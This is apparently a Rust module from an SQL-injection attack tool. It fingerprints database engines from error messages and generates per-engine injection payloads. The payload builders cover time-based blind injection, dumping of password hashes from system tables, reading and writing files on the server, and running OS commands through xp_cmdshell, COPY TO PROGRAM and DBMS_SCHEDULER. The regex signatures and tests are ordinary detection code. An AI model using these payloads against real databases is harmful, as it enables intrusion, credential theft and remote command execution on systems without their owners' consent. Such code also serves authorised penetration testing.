//! DBMS fingerprinting via error messages, banner strings, and behavioral
//! characteristics.

use regex::Regex;
use std::sync::LazyLock;

/// Supported database management systems.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
pub enum Dbms {
    MySQL,
    PostgreSQL,
    MSSQL,
    Oracle,
    SQLite,
    MariaDB,
    DB2,
    Firebird,
    Unknown,
}

impl std::fmt::Display for Dbms {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::MySQL => write!(f, "MySQL"),
            Self::PostgreSQL => write!(f, "PostgreSQL"),
            Self::MSSQL => write!(f, "Microsoft SQL Server"),
            Self::Oracle => write!(f, "Oracle"),
            Self::SQLite => write!(f, "SQLite"),
            Self::MariaDB => write!(f, "MariaDB"),
            Self::DB2 => write!(f, "IBM DB2"),
            Self::Firebird => write!(f, "Firebird"),
            Self::Unknown => write!(f, "Unknown"),
        }
    }
}

impl Dbms {
    /// Parse from a CLI string (case-insensitive).
    pub fn from_str_loose(s: &str) -> Option<Self> {
        match s.to_lowercase().as_str() {
            "mysql" => Some(Self::MySQL),
            "postgresql" | "postgres" | "pgsql" | "pg" => Some(Self::PostgreSQL),
            "mssql" | "microsoft sql server" | "sqlserver" => Some(Self::MSSQL),
            "oracle" => Some(Self::Oracle),
            "sqlite" | "sqlite3" => Some(Self::SQLite),
            "mariadb" | "maria" => Some(Self::MariaDB),
            "db2" | "ibm db2" => Some(Self::DB2),
            "firebird" => Some(Self::Firebird),
            _ => None,
        }
    }

    /// SQL single-line comment prefix.
    pub fn comment_single(&self) -> &'static str {
        match self {
            Self::MySQL | Self::MariaDB => "-- ",
            Self::PostgreSQL => "-- ",
            Self::MSSQL => "-- ",
            Self::Oracle => "-- ",
            Self::SQLite => "-- ",
            Self::DB2 => "-- ",
            Self::Firebird => "-- ",
            Self::Unknown => "-- ",
        }
    }

    /// Alternative comment or line terminator (MySQL/MariaDB support `#`).
    pub fn comment_alt(&self) -> Option<&'static str> {
        match self {
            Self::MySQL | Self::MariaDB => Some("#"),
            _ => None,
        }
    }

    /// String concatenation expression for two strings.
    pub fn concat(&self, a: &str, b: &str) -> String {
        match self {
            Self::MySQL | Self::MariaDB => format!("CONCAT({a},{b})"),
            Self::PostgreSQL | Self::SQLite | Self::DB2 | Self::Firebird => {
                format!("({a}||{b})")
            }
            Self::MSSQL => format!("({a}+{b})"),
            Self::Oracle => format!("({a}||{b})"),
            Self::Unknown => format!("CONCAT({a},{b})"),
        }
    }

    /// Sleep/delay function call for n seconds.
    pub fn sleep_call(&self, secs: u32) -> String {
        match self {
            Self::MySQL | Self::MariaDB => format!("SLEEP({secs})"),
            Self::PostgreSQL => format!("pg_sleep({secs})"),
            Self::MSSQL => format!("WAITFOR DELAY '0:0:{secs}'"),
            Self::Oracle => {
                format!("DBMS_PIPE.RECEIVE_MESSAGE(CHR(65)||CHR(66),{secs})")
            }
            Self::SQLite => format!("RANDOMBLOB(100000000/1)"), // CPU-bound delay
            Self::DB2 => format!("SLEEP({secs})"),
            Self::Firebird => format!("(SELECT 1 FROM RDB$DATABASE WHERE 1=1)"), // limited
            Self::Unknown => format!("SLEEP({secs})"),
        }
    }

    /// Inline sleep payload for injection (includes AND/OR prefix).
    pub fn time_payload(&self, secs: u32) -> String {
        match self {
            Self::MySQL | Self::MariaDB => format!("AND SLEEP({secs})"),
            Self::PostgreSQL => format!("AND (SELECT pg_sleep({secs}))::text=''"),
            Self::MSSQL => format!("; WAITFOR DELAY '0:0:{secs}'--"),
            Self::Oracle => format!(
                "AND 1=DBMS_PIPE.RECEIVE_MESSAGE(CHR(65)||CHR(66),{secs})"
            ),
            Self::SQLite => format!("AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB({secs}00000000/2))))"),
            Self::DB2 => format!("AND (SELECT COUNT(*) FROM SYSIBM.SYSDUMMY1 AS t1, SYSIBM.SYSDUMMY1 AS t2, SYSIBM.SYSDUMMY1 AS t3)>0"),
            Self::Firebird => format!("AND (SELECT COUNT(*) FROM RDB$FIELDS AS t1, RDB$FIELDS AS t2)>0"),
            Self::Unknown => format!("AND SLEEP({secs})"),
        }
    }

    /// Stacked-query sleep payload (semicolon-separated).
    pub fn stacked_time_payload(&self, secs: u32) -> String {
        match self {
            Self::MySQL | Self::MariaDB => format!("; SELECT SLEEP({secs})"),
            Self::PostgreSQL => format!("; SELECT pg_sleep({secs})"),
            Self::MSSQL => format!("; WAITFOR DELAY '0:0:{secs}'"),
            Self::Oracle => format!(
                "; BEGIN DBMS_LOCK.SLEEP({secs}); END;"
            ),
            _ => format!("; SELECT SLEEP({secs})"),
        }
    }

    /// Version extraction function/expression.
    pub fn version_fn(&self) -> &'static str {
        match self {
            Self::MySQL | Self::MariaDB => "VERSION()",
            Self::PostgreSQL => "VERSION()",
            Self::MSSQL => "@@VERSION",
            Self::Oracle => "banner FROM v$version WHERE ROWNUM=1",
            Self::SQLite => "sqlite_version()",
            Self::DB2 => "SERVICE_LEVEL FROM TABLE(SYSPROC.ENV_GET_INST_INFO()) AS A",
            Self::Firebird => "rdb$get_context('SYSTEM','ENGINE_VERSION') FROM rdb$database",
            Self::Unknown => "VERSION()",
        }
    }

    /// Current database function/expression.
    pub fn current_db_fn(&self) -> &'static str {
        match self {
            Self::MySQL | Self::MariaDB => "DATABASE()",
            Self::PostgreSQL => "CURRENT_DATABASE()",
            Self::MSSQL => "DB_NAME()",
            Self::Oracle => "SYS_CONTEXT('USERENV','DB_NAME') FROM DUAL",
            Self::SQLite => "'main'",
            Self::DB2 => "CURRENT SCHEMA FROM SYSIBM.SYSDUMMY1",
            Self::Firebird => "rdb$get_context('SYSTEM','DB_NAME') FROM rdb$database",
            Self::Unknown => "DATABASE()",
        }
    }

    /// Current user function/expression.
    pub fn current_user_fn(&self) -> &'static str {
        match self {
            Self::MySQL | Self::MariaDB => "CURRENT_USER()",
            Self::PostgreSQL => "CURRENT_USER",
            Self::MSSQL => "SYSTEM_USER",
            Self::Oracle => "USER FROM DUAL",
            Self::SQLite => "'admin'",
            Self::DB2 => "CURRENT USER FROM SYSIBM.SYSDUMMY1",
            Self::Firebird => "CURRENT_USER FROM rdb$database",
            Self::Unknown => "CURRENT_USER()",
        }
    }

    /// Quoting character for string literals.
    pub fn string_quote(&self) -> char {
        '\''
    }

    /// UNION SELECT requires FROM DUAL on some DBMS.
    pub fn from_dummy(&self) -> &'static str {
        match self {
            Self::Oracle => " FROM DUAL",
            Self::DB2 => " FROM SYSIBM.SYSDUMMY1",
            Self::Firebird => " FROM RDB$DATABASE",
            _ => "",
        }
    }

    /// Whether this DBMS supports stacked queries in typical configurations.
    pub fn supports_stacked(&self) -> bool {
        matches!(self, Self::MSSQL | Self::PostgreSQL | Self::MySQL | Self::MariaDB)
    }

    /// Catalog table for listing databases.
    pub fn databases_query(&self) -> &'static str {
        match self {
            Self::MySQL | Self::MariaDB => {
                "SELECT schema_name FROM information_schema.schemata"
            }
            Self::PostgreSQL => "SELECT datname FROM pg_database",
            Self::MSSQL => "SELECT name FROM master..sysdatabases",
            Self::Oracle => "SELECT DISTINCT owner FROM all_tables",
            Self::SQLite => "SELECT 'main' AS name",
            Self::DB2 => "SELECT schemaname FROM syscat.schemata",
            Self::Firebird => "SELECT 'main' AS name FROM rdb$database",
            Self::Unknown => "SELECT schema_name FROM information_schema.schemata",
        }
    }

    /// Catalog query for listing tables in a given database/schema.
    pub fn tables_query(&self, database: &str) -> String {
        match self {
            Self::MySQL | Self::MariaDB => format!(
                "SELECT table_name FROM information_schema.tables WHERE table_schema='{database}'"
            ),
            Self::PostgreSQL => format!(
                "SELECT table_name FROM information_schema.tables WHERE table_catalog='{database}' AND table_schema='public'"
            ),
            Self::MSSQL => format!(
                "SELECT table_name FROM {database}.information_schema.tables"
            ),
            Self::Oracle => format!(
                "SELECT table_name FROM all_tables WHERE owner='{database}'"
            ),
            Self::SQLite => {
                "SELECT name FROM sqlite_master WHERE type='table'".to_string()
            }
            Self::DB2 => format!(
                "SELECT tabname FROM syscat.tables WHERE tabschema='{database}'"
            ),
            Self::Firebird => {
                "SELECT RDB$RELATION_NAME FROM RDB$RELATIONS WHERE RDB$SYSTEM_FLAG=0"
                    .to_string()
            }
            Self::Unknown => format!(
                "SELECT table_name FROM information_schema.tables WHERE table_schema='{database}'"
            ),
        }
    }

    /// Catalog query for listing columns of a table.
    pub fn columns_query(&self, database: &str, table: &str) -> String {
        match self {
            Self::MySQL | Self::MariaDB => format!(
                "SELECT column_name FROM information_schema.columns WHERE table_schema='{database}' AND table_name='{table}'"
            ),
            Self::PostgreSQL => format!(
                "SELECT column_name FROM information_schema.columns WHERE table_catalog='{database}' AND table_name='{table}'"
            ),
            Self::MSSQL => format!(
                "SELECT column_name FROM {database}.information_schema.columns WHERE table_name='{table}'"
            ),
            Self::Oracle => format!(
                "SELECT column_name FROM all_tab_columns WHERE owner='{database}' AND table_name='{table}'"
            ),
            Self::SQLite => format!("PRAGMA table_info({table})"),
            Self::DB2 => format!(
                "SELECT colname FROM syscat.columns WHERE tabschema='{database}' AND tabname='{table}'"
            ),
            Self::Firebird => format!(
                "SELECT RDB$FIELD_NAME FROM RDB$RELATION_FIELDS WHERE RDB$RELATION_NAME='{table}'"
            ),
            Self::Unknown => format!(
                "SELECT column_name FROM information_schema.columns WHERE table_schema='{database}' AND table_name='{table}'"
            ),
        }
    }

    /// Query to list database users.
    pub fn users_query(&self) -> &'static str {
        match self {
            Self::MySQL | Self::MariaDB => "SELECT user FROM mysql.user",
            Self::PostgreSQL => "SELECT usename FROM pg_user",
            Self::MSSQL => "SELECT name FROM master..syslogins",
            Self::Oracle => "SELECT username FROM all_users",
            Self::SQLite => "SELECT 'admin' AS user",
            Self::DB2 => "SELECT grantee FROM syscat.dbauth",
            Self::Firebird => "SELECT DISTINCT RDB$USER FROM RDB$USER_PRIVILEGES",
            Self::Unknown => "SELECT user FROM mysql.user",
        }
    }

    /// Query to list password hashes.
    pub fn password_hashes_query(&self) -> &'static str {
        match self {
            Self::MySQL | Self::MariaDB => {
                "SELECT user, authentication_string FROM mysql.user"
            }
            Self::PostgreSQL => "SELECT usename, passwd FROM pg_shadow",
            Self::MSSQL => {
                "SELECT name, CONVERT(VARCHAR(256), password_hash, 1) FROM sys.sql_logins"
            }
            Self::Oracle => {
                "SELECT username, password FROM dba_users"
            }
            _ => "SELECT 'unsupported' AS user, 'N/A' AS hash",
        }
    }

    /// Query to list user privileges.
    pub fn privileges_query(&self) -> &'static str {
        match self {
            Self::MySQL | Self::MariaDB => {
                "SELECT grantee, privilege_type FROM information_schema.user_privileges"
            }
            Self::PostgreSQL => {
                "SELECT grantee, privilege_type FROM information_schema.role_table_grants"
            }
            Self::MSSQL => "SELECT name, type_desc FROM sys.server_principals",
            Self::Oracle => "SELECT grantee, privilege FROM dba_sys_privs",
            _ => "SELECT 'unsupported', 'N/A'",
        }
    }

    /// File read payload (returns SQL expression or None if unsupported).
    pub fn file_read_expr(&self, path: &str) -> Option<String> {
        match self {
            Self::MySQL | Self::MariaDB => {
                Some(format!("LOAD_FILE('{path}')"))
            }
            Self::PostgreSQL => {
                Some(format!("pg_read_file('{path}')"))
            }
            Self::MSSQL => Some(format!(
                "(SELECT BulkColumn FROM OPENROWSET(BULK '{path}', SINGLE_CLOB) AS x)"
            )),
            Self::Oracle => {
                // UTL_FILE requires directory object; use Java for arbitrary reads
                Some(format!(
                    "UTL_RAW.CAST_TO_VARCHAR2(UTL_FILE.GET_RAW(UTL_FILE.FOPEN('/','{path}','R'),32767))"
                ))
            }
            _ => None,
        }
    }

    /// File write payload components. Returns (pre_sql, post_sql) or None.
    pub fn file_write_sql(&self, path: &str, content: &str) -> Option<String> {
        match self {
            Self::MySQL | Self::MariaDB => Some(format!(
                "SELECT '{content}' INTO OUTFILE '{path}'"
            )),
            Self::PostgreSQL => Some(format!(
                "COPY (SELECT '{content}') TO '{path}'"
            )),
            Self::MSSQL => Some(format!(
                "EXEC master..xp_cmdshell 'echo {content} > {path}'"
            )),
            _ => None,
        }
    }

    /// OS command execution payload. Returns SQL or None if unsupported.
    pub fn os_cmd_sql(&self, command: &str) -> Option<String> {
        match self {
            Self::MSSQL => Some(format!(
                "EXEC master..xp_cmdshell '{command}'"
            )),
            Self::PostgreSQL => Some(format!(
                "COPY (SELECT '') TO PROGRAM '{command}'"
            )),
            Self::MySQL | Self::MariaDB => {
                // Requires UDF — sys_exec must be loaded first
                Some(format!("SELECT sys_exec('{command}')"))
            }
            Self::Oracle => Some(format!(
                "BEGIN DBMS_SCHEDULER.CREATE_JOB(job_name=>'corvex_cmd', job_type=>'EXECUTABLE', job_action=>'{command}', enabled=>TRUE); END;"
            )),
            _ => None,
        }
    }
}

// ---------------------------------------------------------------------------
// Error-based DBMS fingerprinting
// ---------------------------------------------------------------------------

struct ErrorPattern {
    dbms: Dbms,
    pattern: Regex,
    description: &'static str,
}

static ERROR_PATTERNS: LazyLock<Vec<ErrorPattern>> = LazyLock::new(|| {
    vec![
        // ---- MySQL ----
        ErrorPattern {
            dbms: Dbms::MySQL,
            pattern: Regex::new(r"(?i)SQL syntax.*?MySQL").unwrap(),
            description: "MySQL SQL syntax error",
        },
        ErrorPattern {
            dbms: Dbms::MySQL,
            pattern: Regex::new(r"(?i)Warning.*?\Wmysqli?_").unwrap(),
            description: "PHP MySQL warning",
        },
        ErrorPattern {
            dbms: Dbms::MySQL,
            pattern: Regex::new(r"(?i)MySqlClient\.").unwrap(),
            description: ".NET MySQL client error",
        },
        ErrorPattern {
            dbms: Dbms::MySQL,
            pattern: Regex::new(r"(?i)com\.mysql\.jdbc").unwrap(),
            description: "Java MySQL JDBC error",
        },
        ErrorPattern {
            dbms: Dbms::MySQL,
            pattern: Regex::new(r"(?i)Unclosed quotation mark after the character string").unwrap(),
            description: "MySQL unclosed quotation",
        },
        ErrorPattern {
            dbms: Dbms::MySQL,
            pattern: Regex::new(r"(?i)check the manual that corresponds to your (MySQL|MariaDB) server version").unwrap(),
            description: "MySQL version manual reference",
        },
        ErrorPattern {
            dbms: Dbms::MySQL,
            pattern: Regex::new(r"(?i)You have an error in your SQL syntax").unwrap(),
            description: "MySQL generic SQL syntax error",
        },
        ErrorPattern {
            dbms: Dbms::MySQL,
            pattern: Regex::new(r#"(?i)Unknown column '[^']+' in"#).unwrap(),
            description: "MySQL unknown column",
        },
        // ---- MariaDB ----
        ErrorPattern {
            dbms: Dbms::MariaDB,
            pattern: Regex::new(r"(?i)MariaDB server version").unwrap(),
            description: "MariaDB server version in error",
        },
        // ---- PostgreSQL ----
        ErrorPattern {
            dbms: Dbms::PostgreSQL,
            pattern: Regex::new(r"(?i)PostgreSQL.*?ERROR").unwrap(),
            description: "PostgreSQL error message",
        },
        ErrorPattern {
            dbms: Dbms::PostgreSQL,
            pattern: Regex::new(r"(?i)Warning.*?\Wpg_").unwrap(),
            description: "PHP PostgreSQL warning",
        },
        ErrorPattern {
            dbms: Dbms::PostgreSQL,
            pattern: Regex::new(r"(?i)valid PostgreSQL result").unwrap(),
            description: "PostgreSQL invalid result",
        },
        ErrorPattern {
            dbms: Dbms::PostgreSQL,
            pattern: Regex::new(r"(?i)Npgsql\.").unwrap(),
            description: ".NET Npgsql error",
        },
        ErrorPattern {
            dbms: Dbms::PostgreSQL,
            pattern: Regex::new(r"(?i)PG::SyntaxError").unwrap(),
            description: "Ruby PG syntax error",
        },
        ErrorPattern {
            dbms: Dbms::PostgreSQL,
            pattern: Regex::new(r"(?i)org\.postgresql\.util\.PSQLException").unwrap(),
            description: "Java PostgreSQL JDBC error",
        },
        ErrorPattern {
            dbms: Dbms::PostgreSQL,
            pattern: Regex::new(r"(?i)ERROR:\s+syntax error at or near").unwrap(),
            description: "PostgreSQL syntax error at or near",
        },
        ErrorPattern {
            dbms: Dbms::PostgreSQL,
            pattern: Regex::new(r"(?i)ERROR:\s+unterminated quoted string").unwrap(),
            description: "PostgreSQL unterminated string",
        },
        // ---- Microsoft SQL Server ----
        ErrorPattern {
            dbms: Dbms::MSSQL,
            pattern: Regex::new(r"(?i)Driver.*? SQL[\-_ ]*Server").unwrap(),
            description: "MSSQL driver error",
        },
        ErrorPattern {
            dbms: Dbms::MSSQL,
            pattern: Regex::new(r"(?i)OLE DB.*? SQL Server").unwrap(),
            description: "MSSQL OLE DB error",
        },
        ErrorPattern {
            dbms: Dbms::MSSQL,
            pattern: Regex::new(r"(?i)\bSQL Server[^<]*?Error").unwrap(),
            description: "SQL Server generic error",
        },
        ErrorPattern {
            dbms: Dbms::MSSQL,
            pattern: Regex::new(r"(?i)Warning.*?\W(mssql|sqlsrv)_").unwrap(),
            description: "PHP MSSQL warning",
        },
        ErrorPattern {
            dbms: Dbms::MSSQL,
            pattern: Regex::new(r"(?i)\[Microsoft\]\[ODBC SQL Server Driver\]").unwrap(),
            description: "MSSQL ODBC driver error",
        },
        ErrorPattern {
            dbms: Dbms::MSSQL,
            pattern: Regex::new(r"(?i)Microsoft OLE DB Provider for SQL Server").unwrap(),
            description: "MSSQL OLE DB provider",
        },
        ErrorPattern {
            dbms: Dbms::MSSQL,
            pattern: Regex::new(r"(?i)com\.microsoft\.sqlserver\.jdbc").unwrap(),
            description: "Java MSSQL JDBC error",
        },
        ErrorPattern {
            dbms: Dbms::MSSQL,
            pattern: Regex::new(r"(?i)Msg \d+, Level \d+, State \d+").unwrap(),
            description: "MSSQL numbered message",
        },
        ErrorPattern {
            dbms: Dbms::MSSQL,
            pattern: Regex::new(r"(?i)Unclosed quotation mark after the character string").unwrap(),
            description: "MSSQL unclosed quotation",
        },
        // ---- Oracle ----
        ErrorPattern {
            dbms: Dbms::Oracle,
            pattern: Regex::new(r"(?i)\bORA-[0-9]{4,5}").unwrap(),
            description: "Oracle ORA error code",
        },
        ErrorPattern {
            dbms: Dbms::Oracle,
            pattern: Regex::new(r"(?i)Oracle error").unwrap(),
            description: "Oracle generic error",
        },
        ErrorPattern {
            dbms: Dbms::Oracle,
            pattern: Regex::new(r"(?i)Oracle.*?Driver").unwrap(),
            description: "Oracle driver error",
        },
        ErrorPattern {
            dbms: Dbms::Oracle,
            pattern: Regex::new(r"(?i)Warning.*?\Woci_").unwrap(),
            description: "PHP OCI warning",
        },
        ErrorPattern {
            dbms: Dbms::Oracle,
            pattern: Regex::new(r"(?i)quoted string not properly terminated").unwrap(),
            description: "Oracle unterminated string",
        },
        ErrorPattern {
            dbms: Dbms::Oracle,
            pattern: Regex::new(r"(?i)java\.sql\.SQLException.*?Oracle").unwrap(),
            description: "Java Oracle JDBC error",
        },
        // ---- SQLite ----
        ErrorPattern {
            dbms: Dbms::SQLite,
            pattern: Regex::new(r"(?i)SQLite/JQlite").unwrap(),
            description: "SQLite/JQLite error",
        },
        ErrorPattern {
            dbms: Dbms::SQLite,
            pattern: Regex::new(r"(?i)Warning.*?\Wsqlite_").unwrap(),
            description: "PHP SQLite warning",
        },
        ErrorPattern {
            dbms: Dbms::SQLite,
            pattern: Regex::new(r"(?i)Warning.*?\WSQLite3::").unwrap(),
            description: "PHP SQLite3 warning",
        },
        ErrorPattern {
            dbms: Dbms::SQLite,
            pattern: Regex::new(r"(?i)\[SQLITE_ERROR\]").unwrap(),
            description: "SQLite error constant",
        },
        ErrorPattern {
            dbms: Dbms::SQLite,
            pattern: Regex::new(r"(?i)SQLite error \d+:").unwrap(),
            description: "SQLite numbered error",
        },
        ErrorPattern {
            dbms: Dbms::SQLite,
            pattern: Regex::new(r"(?i)sqlite3\.OperationalError").unwrap(),
            description: "Python SQLite operational error",
        },
        ErrorPattern {
            dbms: Dbms::SQLite,
            pattern: Regex::new(r"(?i)SQLite3::SQLException").unwrap(),
            description: "Ruby SQLite exception",
        },
        ErrorPattern {
            dbms: Dbms::SQLite,
            pattern: Regex::new(r#"(?i)near ".*?": syntax error"#).unwrap(),
            description: "SQLite syntax error near",
        },
        // ---- IBM DB2 ----
        ErrorPattern {
            dbms: Dbms::DB2,
            pattern: Regex::new(r"(?i)CLI Driver.*?DB2").unwrap(),
            description: "DB2 CLI driver error",
        },
        ErrorPattern {
            dbms: Dbms::DB2,
            pattern: Regex::new(r"(?i)DB2 SQL error").unwrap(),
            description: "DB2 SQL error",
        },
        ErrorPattern {
            dbms: Dbms::DB2,
            pattern: Regex::new(r"(?i)\bdb2_\w+\(").unwrap(),
            description: "PHP DB2 function error",
        },
        ErrorPattern {
            dbms: Dbms::DB2,
            pattern: Regex::new(r"(?i)SQLSTATE\[42\d{3}\]").unwrap(),
            description: "DB2 SQLSTATE error",
        },
        ErrorPattern {
            dbms: Dbms::DB2,
            pattern: Regex::new(r"(?i)SQLCODE=-\d+").unwrap(),
            description: "DB2 SQLCODE negative error",
        },
        ErrorPattern {
            dbms: Dbms::DB2,
            pattern: Regex::new(r"(?i)com\.ibm\.db2\.jcc").unwrap(),
            description: "Java DB2 JCC error",
        },
        // ---- Firebird ----
        ErrorPattern {
            dbms: Dbms::Firebird,
            pattern: Regex::new(r"(?i)Dynamic SQL Error").unwrap(),
            description: "Firebird dynamic SQL error",
        },
        ErrorPattern {
            dbms: Dbms::Firebird,
            pattern: Regex::new(r"(?i)Warning.*?\Wibase_").unwrap(),
            description: "PHP Firebird warning",
        },
        ErrorPattern {
            dbms: Dbms::Firebird,
            pattern: Regex::new(r"(?i)org\.firebirdsql\.jdbc").unwrap(),
            description: "Java Firebird JDBC error",
        },
        ErrorPattern {
            dbms: Dbms::Firebird,
            pattern: Regex::new(r"(?i)Firebird.*?error").unwrap(),
            description: "Firebird generic error",
        },
    ]
});

/// Error match result from fingerprinting.
#[derive(Debug, Clone)]
pub struct ErrorMatch {
    pub dbms: Dbms,
    pub description: &'static str,
    pub matched_text: String,
}

/// Scan a response body for known DBMS error signatures.
/// Returns all matches found (there may be multiple DBMS indicators).
pub fn fingerprint_from_error(body: &str) -> Vec<ErrorMatch> {
    let mut results = Vec::new();
    for pat in ERROR_PATTERNS.iter() {
        if let Some(m) = pat.pattern.find(body) {
            results.push(ErrorMatch {
                dbms: pat.dbms,
                description: pat.description,
                matched_text: m.as_str().to_string(),
            });
        }
    }
    results
}

/// Determine the most likely DBMS from a set of error matches.
/// Returns the DBMS that appears most frequently.
pub fn best_dbms(matches: &[ErrorMatch]) -> Dbms {
    if matches.is_empty() {
        return Dbms::Unknown;
    }
    let mut counts = std::collections::HashMap::new();
    for m in matches {
        *counts.entry(m.dbms).or_insert(0u32) += 1;
    }
    counts
        .into_iter()
        .max_by_key(|(_, c)| *c)
        .map(|(d, _)| d)
        .unwrap_or(Dbms::Unknown)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn mysql_error_detection() {
        let body = r#"<b>Warning</b>: mysqli_query(): You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''' at line 1"#;
        let matches = fingerprint_from_error(body);
        assert!(!matches.is_empty());
        assert_eq!(best_dbms(&matches), Dbms::MySQL);
    }

    #[test]
    fn postgresql_error_detection() {
        let body = r#"ERROR:  syntax error at or near "'" LINE 1: SELECT * FROM users WHERE id = '''"#;
        let matches = fingerprint_from_error(body);
        assert!(!matches.is_empty());
        assert_eq!(best_dbms(&matches), Dbms::PostgreSQL);
    }

    #[test]
    fn mssql_error_detection() {
        let body = r#"Microsoft OLE DB Provider for SQL Server error '80040e14' Unclosed quotation mark after the character string ''."#;
        let matches = fingerprint_from_error(body);
        assert!(!matches.is_empty());
        assert_eq!(best_dbms(&matches), Dbms::MSSQL);
    }

    #[test]
    fn oracle_error_detection() {
        let body = r#"ORA-01756: quoted string not properly terminated"#;
        let matches = fingerprint_from_error(body);
        assert!(!matches.is_empty());
        assert_eq!(best_dbms(&matches), Dbms::Oracle);
    }

    #[test]
    fn sqlite_error_detection() {
        let body = r#"sqlite3.OperationalError: near "'": syntax error"#;
        let matches = fingerprint_from_error(body);
        assert!(!matches.is_empty());
        assert_eq!(best_dbms(&matches), Dbms::SQLite);
    }

    #[test]
    fn db2_error_detection() {
        let body = r#"DB2 SQL error: SQLCODE=-104, SQLSTATE=42601"#;
        let matches = fingerprint_from_error(body);
        assert!(!matches.is_empty());
        assert_eq!(best_dbms(&matches), Dbms::DB2);
    }

    #[test]
    fn firebird_error_detection() {
        let body = r#"Dynamic SQL Error SQL error code = -104"#;
        let matches = fingerprint_from_error(body);
        assert!(!matches.is_empty());
        assert_eq!(best_dbms(&matches), Dbms::Firebird);
    }

    #[test]
    fn no_match_returns_empty() {
        let body = "This is a normal web page with no errors.";
        let matches = fingerprint_from_error(body);
        assert!(matches.is_empty());
    }
}
